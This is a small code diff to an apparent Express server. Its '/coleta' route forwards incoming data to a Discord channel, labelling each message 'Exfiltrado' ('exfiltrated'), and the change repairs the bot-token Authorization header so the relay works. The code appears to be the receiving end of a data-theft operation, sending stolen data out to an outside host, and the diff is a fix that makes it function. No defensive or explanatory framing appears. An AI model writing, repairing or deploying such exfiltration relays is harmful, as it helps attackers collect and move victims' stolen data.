@@ -212,7 +212,7 @@ app.post('/coleta', async (req, res) => {
   await fetch('https://discord.com/api/v10/channels/1392213201067970631/messages', {
     method: 'POST',
     headers: {
-      'Authorization': process.env.DC_BotToken,
+      'Authorization': `Bot ${process.env.DC_BotToken}`,
       'Content-Type': 'application/json'
     },
     body: JSON.stringify({ content: `Exfiltrado: \n \`\`\`\n${data}\`\`\`` })
